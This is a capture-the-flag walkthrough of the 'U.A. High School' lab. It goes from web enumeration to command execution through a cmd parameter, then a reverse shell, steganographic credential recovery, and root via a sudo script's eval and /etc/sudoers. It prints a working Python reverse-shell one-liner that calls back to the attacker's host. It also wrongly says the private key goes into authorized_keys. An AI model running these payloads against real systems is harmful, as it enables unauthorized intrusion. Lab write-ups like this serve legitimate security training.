# U.A. High School

I started by enumrating the machine:

![nmap.png](/images/reports/ua_high_school/nmap.png)

![gobuster.png](/images/reports/ua_high_school/gobuster.png)

Nmap and Gobuster didn’t give much to work with. I went to `/assets` but I don’t see anything, inspecting the request in Burp the only thing that changes is that a PHPSESSID cookie is set. I did another Gobuster search but from `/assets` to see if there is anything hidden:

![gobuster2.png](/images/reports/ua_high_school/gobuster2.png)

I’ve got `/images` , but unfortunately I am forbidden to see this page.

I returned to the `/assets` page, since this is using PHP I tried the `index.php` page, and no error showed up, so it exists. Next, since I was at a crossroad I went online and someone suggested trying `dirsearch` and this was the output:

![dirsearch.png](/images/reports/ua_high_school/dirsearch.png)

This is really interesting, I went to this page and found this:

![page.png](/images/reports/ua_high_school/page.png)

I went to Cyberchef and decoded de string and got this:

![cyberchef.png](/images/reports/ua_high_school/cyberchef.png)

So it listed the files inside the directory `p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2`.

Since we have the cmd parameter I tried it on the index.php and got the same 3 files outputed. So we can run command on the server, this immediately made me think of getting a reverse shell.

I tried multiple payloads, but the only one that worked was a Python one:
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.183.50",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'` 

After triggering the reverse shell I got back the shell on my machine:

![image.png](/images/reports/ua_high_school/image.png)

Looking through the directories I first found a directory called ‘Hidden_Content’ inside the `/var/www` directory. Inside it is a txt file called ‘passphrase’ that contains a base64 encoded string. I decoded it:

![passphrase.png](/images/reports/ua_high_school/passphrase.png)

This is deliberate and might be of future use.

Next, I looked for the user flag which resides inside the `/home/deku` directory. I don’t have yet the permission to read the file, so we need to first escalate to the user ‘deku’ to read the file. 

I looked at different directories, but nothing interesting showed up. So I returned to the `/assets/images` directory. This contained 2 images, since maybe is something hidden inside them, i got the first picture on my machine using `wget` to test if it’s worth something:

![images.png](/images/reports/ua_high_school/images.png)

![wget.png](/images/reports/ua_high_school/wget.png)

When I tried to open the image I saw that the image was corrupted, this also showed in `exiftool`. I figured that I needed to change the image header to JPG in order to get it to work. I opened `hexeditor` and changed the values according to the correct header:

![hexeditor.png](/images/reports/ua_high_school/hexeditor.png)

Now I passed it to `steghide` and we already found the passphrase:

![creds.png](/images/reports/ua_high_school/creds.png)

And now I have the credentials for the user ‘deku’:

![deku.png](/images/reports/ua_high_school/deku.png)

And I got the user flag, now we need to escalate to root:

![user flag.png](/images/reports/ua_high_school/user_flag.png)

Running sudo -l gave me this:

![script.png](/images/reports/ua_high_school/script.png)

I tried modifying it to get a rev shell but I don’t ahve the permissions. I needed a hint so I looked up online and apparently the important section of the code is the ‘eval’ section. To get root we can generate on the host machine a pair of SSH keys, then we will put the private key in the input given by the script and specifiy that the key should be put in /root/.ssh/authorized_keys. This way we can the login with our key directly as root. I could’nt get this to work for some reason, but I found another easier method showed by Sunny ([https://infosecwriteups.com/u-a-high-school-tryhackme-walkthrough-writeup-beginner-friendly-thm-sunny-802daabf3ac4](https://infosecwriteups.com/u-a-high-school-tryhackme-walkthrough-writeup-beginner-friendly-thm-sunny-802daabf3ac4)), we can modify the /etc/sudoers file to grant us root access.

 

![root.png](/images/reports/ua_high_school/root.png)